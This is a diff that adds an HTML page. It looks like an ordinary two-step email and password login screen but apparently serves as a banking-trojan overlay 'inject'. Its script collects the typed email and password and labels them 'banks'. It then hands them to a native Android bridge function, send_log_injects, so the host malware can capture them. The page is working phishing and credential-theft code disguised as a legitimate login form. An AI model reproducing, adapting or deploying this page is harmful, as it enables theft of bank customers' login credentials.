@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #f7f7f7;
+        }
+
+        #form1,#form2 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            flex: 0.5;
+        }
+
+        section {
+            flex: 0.5;
+        }
+
+        footer {
+            padding: 15px 10px;
+        }
+
+        .input {
+            padding: 12px;
+            background-color: #fff;
+            text-align: center;
+            border: 0;
+            font-weight: 600;
+            width: 100%;
+        }
+
+        .input::placeholder {
+            color: #d6d7d5;
+            opacity: 1;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            background-color: #4050fb;
+            color: #fff;
+            font-weight: 600;
+            border: 0;
+            border-bottom: 2px solid #d2d2d2;
+            border-radius: 75px;
+        }
+
+        .button:disabled {
+            background-color: #d6d7d5;
+            border-color: #d6d7d5;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#4050fb"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAa4AAABFCAMAAAAl3/JdAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzVGMDc0OUM5MEE2MTFFQUJGMDNEMDhDOTE2RDdDNzMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzVGMDc0OUQ5MEE2MTFFQUJGMDNEMDhDOTE2RDdDNzMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozNUYwNzQ5QTkwQTYxMUVBQkYwM0QwOEM5MTZEN0M3MyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNUYwNzQ5QjkwQTYxMUVBQkYwM0QwOEM5MTZEN0M3MyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnEj3wkAAADMUExURQAAACQkJD8/P0BQ+0lY+0xb+01c+05d+1Jg+1RUVFZk+1dl+1ln+1tp/F1q/GBt/GdnZ216/G56/HJ+/HN+/HN//HSA/HaB/HaC/Hh4eIaQ/YeHh4iS/YyW/Y2W/ZaWlqOjo7CwsLW8/be9/ry8vMjIyM/Pz9TU1Nrd/tve/tzf/t3f/t3f/93g/9/f39/h/t/i/+Dk/+Xl5erq6urs/u3u/+3v/+7v//Dx//T1//X19fb2//f39/j5//n6//r6//r7//39//3+/////22+pc8AAALJSURBVHja7dhZc5RAFIbhBleM0da4ISqgYLvigomKWyL//z95TjczIVMzZYjjBfp+F4Shl1T1U5zuwvRkRjEsAVwELgIXXAQuAhdcBC4CF1wELgIXXAQuAhdcBC4C17/L9eMb6zMfrv1Hdw5ZoLlwfbx97e6HLf+3pmj6voqKDa2xXdzmxmEzhetg78rOm2lz5dan2tzDGgEpzAYuZ+xxR7imcB3s7ey8mDiXNclvuPzbBdfWuVTreT+Z61RrDNe2uVTrWX92riIxxtg8NiZptEpGw42XGnFZ6ZZ2foT0jT1XkxoTRTpVqbNU4UmsY7pMmnLtLRNauBanjL2L5x9/PgNX6ST+Li2EIpFLrKubyU20hivNhSn1DVEuqELQyVXHujBL2vSNMZm0yaBM1NJSDivSO8vgCvn58PK5cXZfnpbLZ3jPZN2bcPGJFWCVS9L6Ab6bL4al57OBy7+tqSm1LdEH9VBOc4rhMkcPLpyR6/jtcuNLk1kbreOqU2uVy2MErkAy5pK6Z0O3zESZtlZSQqsOrsXWdfPSxSdf/mDvOsklL1AcytsKlyx7kgQue8zl1nJZLZSZboLDThe1cC29dq++2hpXofXNruGyWuaUqzVRN3BlvnXMFY9PiVUUfrlk0/nyvzzIi9frbXGVxnYnuNKhkKW6Bw2bXdL2tXI5o4bJiKswieyETsZUTd8qnqv7LoVrxevtZK7FWWOlGEb+8YLLLQ/h9fJs0iX+zoYKOfQeuERGU+iBxPhi6B9QDFe93k2bqypC9K4dXzpt0dfDFc5/21i8hW1ZFGX4UUuXuj3x0I8NH0OkrRv+Dj04aqx43bh+7xPfEebC1e/fv3XEAs2Gqz/8zvrMiIvAReCCi8BF4IKLwEXggovAReCCi8BF4IKLwEXggovARbbM9ZTMKOY9mVHMVzKjwAUXgYvABReBi8AFF/m7+QUDyQ/Qx+fQUQAAAABJRU5ErkJggg==" alt="">
+            </header>
+            <section>
+                <input type="email" class="input" id="login" name="login" onkeyup="check()" placeholder="Enter email address" autocomplete="off" required>
+            </section>
+            <footer>
+                <p style="text-align: center;font-size: 12px;">You can find out more about how we treat you personal data by reading our <span style="color: #4050fb;">Privacy Norice</span>.</p>
+                <input type="submit" class="button" id="nextPage" value="Next" disabled>
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAa4AAABFCAMAAAAl3/JdAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MUMzOUU1RTc5MEE2MTFFQUI1OUU5Q0IzRkRDQjRENjQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MUMzOUU1RTg5MEE2MTFFQUI1OUU5Q0IzRkRDQjRENjQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxQzM5RTVFNTkwQTYxMUVBQjU5RTlDQjNGRENCNEQ2NCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxQzM5RTVFNjkwQTYxMUVBQjU5RTlDQjNGRENCNEQ2NCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgqHMDYAAADMUExURQAAACQkJD8/P0BQ+0lY+0xb+01c+05d+1Jg+1RUVFZk+1dl+1ln+1tp/F1q/GBt/GdnZ216/G56/HJ+/HN+/HN//HSA/HaB/HaC/Hh4eIaQ/YeHh4iS/YyW/Y2W/ZaWlqOjo7CwsLW8/be9/ry8vMjIyM/Pz9TU1Nrd/tve/tzf/t3f/t3f/93g/9/f39/h/t/i/+Dk/+Xl5erq6urs/u3u/+3v/+7v//Dx//T1//X19fb2//f39/j5//n6//r6//r7//39//3+/////22+pc8AAAKASURBVHja7djbctMwFIXhZQMFkQRMwskI8DbIiKM5iKYgDm1Z7/9OXLhpe4k9pYyZ9V9kcuHRZPY3I8kB1YyCRiAuJS4lLnEpcSlxiUuJS4lLXEpcSlziUuJS4hKXEpcS1//LdfhD85kP1/7T+0f/5DelNgpmLNfBvVsPPo9aK8cYL2LQBhPMSK7t5ubi/ci1AAA+i+vSubabxeL12LUQY3Bw4rpsru1msXg1ei2QzAV6pmAWMkkms7YnmVuzSJrlk4/WEsnOrCNJ9q1ZIJlaMy+ucVzbzWLxkpO4WCHSAMBlsgOAmkwFgIJ0iExAJIHM7HbPRQAoyTBsqOIaw3Ww2bv67Os0rh5IzD1TiUBWMPaJNNQ59WQDYwCMEY6s4FPyqMgIx9wzF2iZKnGN4fr15MaV863e/CmXWQ344ZLoYQPIcBy5niQ7OHrAsUHDhCKTuUBiREWSAbXOrrFcx4+vTeQCUAWS7W5L6wC4btgMSyMJ5BIlskPcGVVnXwcocY3bDLfr63vPv008u0gmwGINI5naEkhkDhUQyBqG0mAohh2Qw3l2ytWIa8JVY71avp3OFeHODd1heHduYGRAAd+jgCdZIJJxkKtIskfRi2vCRX69Wr6bzJUBbxWMdLV5ILFx1hQIZC6Ajg6IJAPgPRBOuehRNObENfo1eb1afpjKxc4BcIGsT84u251d9ADZojx9znU846KVAKpOMGP/hFqvlh81n7lwcXvn9sMvGtBcuLj/6O6xBjQbLh791HxmxKXEpcQlLiUuJS5xKXEpcYlLiUuJS1xKXEpc4lLiUuISlxKXumCuF2pG4ZOaUfiuZpS4xKXEpcQlLiUuJS5xqb/bb1XJNeW7MYiXAAAAAElFTkSuQmCC" alt="">
+            </header>
+            <section>
+                <input type="password" class="input" id="password" name="password" onkeyup="check2()" placeholder="Enter password" autocomplete="off" required>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" value="Log In" disabled>
+            </footer>
+        </div>
+    </form>
+
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            spinner = document.getElementById('spinner');
+
+        function check() {
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
+                nextPage.disabled = false
+            } else {
+                nextPage.disabled = true
+            }
+        }
+
+        function check2() {
+            if(password.value.length > 3) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        nextPage.onclick = function() {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                form1.style.display = 'none';
+                spinner.style.display = 'none';
+                form2.style.display = 'flex';
+            }, 1500);
+        }
+
+        sendData.onclick = function(){
+            var data = {};
+            data.email = login.value;
+            data.password = password.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
